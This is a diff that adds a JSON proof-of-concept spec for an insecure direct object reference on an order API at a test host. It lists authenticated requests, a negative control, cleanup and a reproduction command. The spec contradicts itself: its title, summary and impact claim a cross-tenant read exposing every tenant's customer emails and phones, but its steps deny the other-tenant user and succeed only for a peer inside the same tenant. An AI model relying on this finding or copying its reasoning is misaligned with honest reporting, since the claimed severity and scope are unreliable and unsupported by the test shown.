@@ -1,0 +1,110 @@
+{
+  "schema": "pocforge/v1",
+  "id": "idor-order-read",
+  "title": "Cross-tenant read of order records via order id",
+  "summary": "Any authenticated member of a tenant can read another tenant's order record, including the customer email and phone, by requesting the order id directly. The item route loads by id without filtering on the caller's tenant.",
+  "target": {
+    "base_url": "https://api.example.test",
+    "asset": "https://api.example.test/v2/orders",
+    "scope_ref": "asset: api.example.test (wildcard, one label deep), captured 2026-10-29T09:12Z",
+    "authorized": true
+  },
+  "preconditions": [
+    "alice owns an order (id 1042) in tenant A on plan pro.",
+    "bob is a member of tenant A and a peer of alice, with no order of his own.",
+    "carol is an owner in tenant B and is used only as the negative control."
+  ],
+  "steps": [
+    {
+      "n": 1,
+      "action": "Authenticate as alice and create an order, extracting its id.",
+      "request": {
+        "method": "POST",
+        "path": "/v2/orders"
+      },
+      "expect": {
+        "status": 201,
+        "extract": {
+          "order_id": "json.id"
+        }
+      }
+    },
+    {
+      "n": 2,
+      "action": "As carol, a member of another tenant, request the same order id.",
+      "request": {
+        "method": "GET",
+        "path": "/v2/orders/{{order_id}}"
+      },
+      "expect": {
+        "status": 404
+      },
+      "control": true
+    },
+    {
+      "n": 3,
+      "action": "As bob, a peer in the same tenant but not the owner, request the order id.",
+      "request": {
+        "method": "GET",
+        "path": "/v2/orders/{{order_id}}"
+      },
+      "expect": {
+        "status": 200,
+        "body_contains": "POC-ALICE-7741"
+      }
+    },
+    {
+      "n": 4,
+      "action": "Delete the order as alice so the test leaves no data behind.",
+      "request": {
+        "method": "DELETE",
+        "path": "/v2/orders/{{order_id}}"
+      },
+      "expect": {
+        "status": 204
+      }
+    }
+  ],
+  "oracle": {
+    "success": [
+      "step 3 returns 200 and the body contains alice's marker POC-ALICE-7741"
+    ],
+    "failure": [
+      "step 3 returns 404 or 403, matching the control in step 2"
+    ],
+    "deterministic": true
+  },
+  "control": "Step 2 is the negative control: carol is in another tenant and must be denied.",
+  "cleanup": [
+    "step 4 deletes the order created in step 1 and expects 204"
+  ],
+  "evidence": [
+    {
+      "kind": "http",
+      "ref": "cleanup-204.http",
+      "bytes": 118,
+      "sha256": "a07fd8c8a293d1733ce1fada3e8b72c4d345cd39aacf9f200c10a0282dc0bfe9"
+    },
+    {
+      "kind": "http",
+      "ref": "step-02-control.http",
+      "bytes": 174,
+      "sha256": "b278c8b2b960380a6ec06917815ec6be7a442e2603b68cda0540a1dcb843d966"
+    },
+    {
+      "kind": "http",
+      "ref": "step-03-trigger.http",
+      "bytes": 221,
+      "sha256": "886711fefbd5c763a745a1d7e391b0f6138b762497bd5423ee9c95671a201709"
+    }
+  ],
+  "impact": {
+    "what": "order records including customer email and phone, readable across tenants",
+    "who": "every tenant with at least one member, since ids are sequential",
+    "severity_claim": "high"
+  },
+  "reproduction": {
+    "command": "python examples/repro_idor.py --base https://api.example.test --alice \"$ALICE\" --bob \"$BOB\" --carol \"$CAROL\""
+  },
+  "evidence_manifest": "manifest.json"
+}
